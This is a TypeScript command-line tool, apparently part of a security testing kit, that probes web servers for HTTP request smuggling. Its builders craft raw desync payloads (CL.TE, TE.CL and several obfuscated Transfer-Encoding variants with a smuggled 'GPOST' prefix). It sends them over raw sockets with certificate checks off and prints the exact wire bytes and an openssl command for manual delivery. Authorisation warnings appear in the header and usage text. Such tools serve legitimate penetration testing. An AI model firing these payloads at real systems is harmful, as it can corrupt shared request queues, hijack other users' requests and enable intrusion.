#!/usr/bin/env bun
/**
 * smuggler.ts — HTTP request smuggling probe.
 *
 * Tests for CL.TE / TE.CL / TE.TE desync vulnerabilities by sending
 * carefully crafted requests where the front-end and back-end disagree
 * on where one request ends and the next begins.
 *
 * Modes:
 *   probe    fire a small set of timing-based probes; report which
 *            (if any) variant produced a noticeable timing delta
 *   classify after a probe identifies a candidate, print the exact
 *            payload + curl command for manual confirmation
 *
 * Background:
 *   - CL.TE: front-end honours Content-Length, back-end honours
 *            Transfer-Encoding. We send `TE: chunked` + `CL: N` and
 *            a chunked body whose terminating `0\r\n\r\n` is followed
 *            by smuggled bytes.
 *   - TE.CL: opposite — front honours TE, back honours CL.
 *   - TE.TE: both honour TE but we obfuscate the header so one ignores
 *            it (`Transfer-Encoding: xchunked`, `Transfer-Encoding :
 *            chunked`, etc).
 *
 * Detection is timing-based: we send a probe whose smuggled prefix
 * blocks the next pipelined request (a fake POST that should hang).
 * If the *next* request takes noticeably longer than baseline, the
 * back-end consumed our smuggled bytes.
 *
 * IMPORTANT:
 *   This is an active probe. Do not run it against systems you don't
 *   own or have written authorisation to test. Even unsuccessful
 *   smuggling probes can corrupt the front-end's request queue and
 *   affect other users.
 *
 * Usage:
 *   bun smuggler.ts probe --url https://target/path --json
 *   bun smuggler.ts classify --variant cl.te --url ...
 */
import { argv } from "node:process"
import { performance } from "node:perf_hooks"
import { ensureHostAllowed, makeArgs, bail, info } from "./_lib/common.ts"

const cli = makeArgs(argv)
const cmd = cli.args[0]
if (!cmd || ["--help", "-h"].includes(cmd)) usage(0)

const url = cli.required("url")
const allowPrivate = cli.has("--allow-private")
const json = cli.has("--json")
ensureHostAllowed(url, allowPrivate)

const parsed = new URL(url)
if (parsed.protocol !== "http:" && parsed.protocol !== "https:") bail(`only http(s) supported`)

interface Variant {
  name: string
  description: string
  build: () => Buffer
}

const VARIANTS: Variant[] = [
  {
    name: "cl.te",
    description: "Content-Length wins for front-end, Transfer-Encoding wins for back-end",
    build: () => buildClTe(),
  },
  {
    name: "te.cl",
    description: "Transfer-Encoding wins for front-end, Content-Length wins for back-end",
    build: () => buildTeCl(),
  },
  {
    name: "te.te (space-prefix)",
    description: "TE confusion via space-prefixed header name",
    build: () => buildTeTeSpace(),
  },
  {
    name: "te.te (xchunked)",
    description: "TE obfuscated as xchunked",
    build: () => buildTeTeXchunked(),
  },
  {
    name: "te.te (\\r in TE)",
    description: "TE obfuscated with bare CR — passes through some proxies",
    build: () => buildTeTeBareCR(),
  },
]

if (cmd === "probe") await cmdProbe()
else if (cmd === "classify") await cmdClassify()
else usage(2)

// ---------------------------------------------------------------------------

interface ProbeResult {
  variant: string
  description: string
  baselineMs: number
  smuggledMs: number
  delta: number
  candidate: boolean
  notes: string
}

async function cmdProbe() {
  const baselines: number[] = []
  for (let i = 0; i < 3; i++) {
    const t0 = performance.now()
    try {
      await fetch(url, { method: "POST", body: "x=1", headers: { "Content-Type": "application/x-www-form-urlencoded" } })
    } catch {
      /* ignore */
    }
    baselines.push(performance.now() - t0)
  }
  const baselineMs = Math.min(...baselines)

  const results: ProbeResult[] = []
  for (const v of VARIANTS) {
    try {
      const payload = v.build()
      const t0 = performance.now()
      await sendRaw(payload)
      const smuggledMs = performance.now() - t0
      const delta = smuggledMs - baselineMs
      const candidate = delta > Math.max(2_000, baselineMs * 4)
      results.push({
        variant: v.name,
        description: v.description,
        baselineMs: Math.round(baselineMs),
        smuggledMs: Math.round(smuggledMs),
        delta: Math.round(delta),
        candidate,
        notes: candidate
          ? "delta exceeds baseline×4 — possible desync"
          : "no significant delta — variant unlikely",
      })
    } catch (e) {
      results.push({
        variant: v.name,
        description: v.description,
        baselineMs: Math.round(baselineMs),
        smuggledMs: 0,
        delta: 0,
        candidate: false,
        notes: `error: ${(e as Error).message}`,
      })
    }
  }

  if (json) {
    console.log(JSON.stringify({ url, baselineMs: Math.round(baselineMs), results }, null, 2))
    return
  }
  console.log(`# Smuggler probe on ${url}\n`)
  console.log(`Baseline POST: ${Math.round(baselineMs)} ms\n`)
  for (const r of results) {
    const tag = r.candidate ? "\x1b[31m⚠\x1b[0m" : " "
    console.log(`${tag} ${r.variant.padEnd(20)} delta=${r.delta.toString().padStart(6)} ms  ${r.notes}`)
  }
  if (results.some((r) => r.candidate)) {
    console.log(`\n→ Run \`smuggler.ts classify --variant <name>\` to see the exact payload for manual confirmation.`)
  }
}

async function cmdClassify() {
  const variantName = cli.required("variant")
  const v = VARIANTS.find((x) => x.name === variantName || x.name.startsWith(variantName))
  if (!v) bail(`unknown variant ${variantName}; pick one of ${VARIANTS.map((x) => x.name).join(", ")}`)
  const payload = v.build()
  console.log(`# Variant: ${v.name}`)
  console.log(`# ${v.description}`)
  console.log(`# Wire bytes (${payload.length}):\n`)
  console.log(payload.toString("utf8").replace(/\r\n/g, "\\r\\n\n"))
  console.log(
    `\n# To send manually:\n  printf '<paste payload>' | openssl s_client -quiet -connect ${parsed.hostname}:${parsed.port || (parsed.protocol === "https:" ? 443 : 80)}`,
  )
}

// ---------------------------------------------------------------------------
// Variant payload builders
// ---------------------------------------------------------------------------

function startLine(): string {
  return `POST ${parsed.pathname}${parsed.search} HTTP/1.1\r\nHost: ${parsed.host}\r\nUser-Agent: crimecode-smuggler/1.0\r\nAccept: */*\r\nConnection: keep-alive\r\n`
}

function buildClTe(): Buffer {
  // Front sees CL=12 (the chunked terminator + smuggled bytes), back honours TE
  // and reads the chunked body, leaving "GPOST /..." in the queue for the next
  // user.
  const body = `0\r\n\r\nG`
  const lines = startLine() + `Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n${body}`
  return Buffer.from(lines)
}

function buildTeCl(): Buffer {
  // Front honours TE, back honours CL=4. Body is "5c\r\nGPOST..." which the
  // front parses as a chunk; the back sees CL=4 and reads only "5c\r\n".
  const body = `5c\r\nGPOST / HTTP/1.1\r\nHost: ${parsed.host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n`
  const lines = startLine() + `Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n${body}`
  return Buffer.from(lines)
}

function buildTeTeSpace(): Buffer {
  // Some proxies normalize "Transfer-Encoding " (trailing space) but don't
  // forward both, ending up routed to a back-end that sees only the second.
  const body = `0\r\n\r\nG`
  const lines =
    startLine() +
    `Content-Length: 6\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding : x\r\n\r\n${body}`
  return Buffer.from(lines)
}

function buildTeTeXchunked(): Buffer {
  const body = `0\r\n\r\nG`
  const lines = startLine() + `Content-Length: 6\r\nTransfer-Encoding: xchunked\r\n\r\n${body}`
  return Buffer.from(lines)
}

function buildTeTeBareCR(): Buffer {
  const body = `0\r\n\r\nG`
  // bare \r in the value
  const lines = startLine() + `Content-Length: 6\r\nTransfer-Encoding: chunked\rTransfer-Encoding: cow\r\n\r\n${body}`
  return Buffer.from(lines)
}

// ---------------------------------------------------------------------------
// Raw send (we cannot use fetch — it manages CL/TE for us).
// ---------------------------------------------------------------------------

async function sendRaw(payload: Buffer): Promise<void> {
  const isHttps = parsed.protocol === "https:"
  const port = Number(parsed.port || (isHttps ? 443 : 80))
  const { connect: tlsConnect } = await import("node:tls")
  const { connect: netConnect } = await import("node:net")

  return new Promise<void>((resolve, reject) => {
    const sock = isHttps
      ? tlsConnect({ host: parsed.hostname, port, servername: parsed.hostname, rejectUnauthorized: false })
      : netConnect({ host: parsed.hostname, port })
    const timer = setTimeout(() => {
      sock.destroy()
      resolve()
    }, 10_000)
    sock.once("connect", () => {
      sock.write(payload)
    })
    sock.once("secureConnect", () => {
      sock.write(payload)
    })
    sock.on("data", () => {
      // Drain — don't resolve immediately; if the server is desynced it
      // may hold the connection for several seconds.
    })
    sock.once("close", () => {
      clearTimeout(timer)
      resolve()
    })
    sock.once("error", (e: Error) => {
      clearTimeout(timer)
      reject(e)
    })
  })
}

// ---------------------------------------------------------------------------

function usage(code: number): never {
  console.error(`smuggler.ts <command> [flags]

HTTP request smuggling probe (CL.TE / TE.CL / TE.TE).

Commands:
  probe    --url URL [--json] [--allow-private]
           Fire timing-based probes for each variant; report candidates.

  classify --variant NAME --url URL
           Print the exact payload bytes for the named variant so you
           can confirm the desync manually with openssl s_client.

⚠ ACTIVE PROBE — only run against systems you own or are explicitly
  authorised to test. Even an unsuccessful probe can corrupt the
  front-end's request queue and affect other users.
`)
  process.exit(code)
}
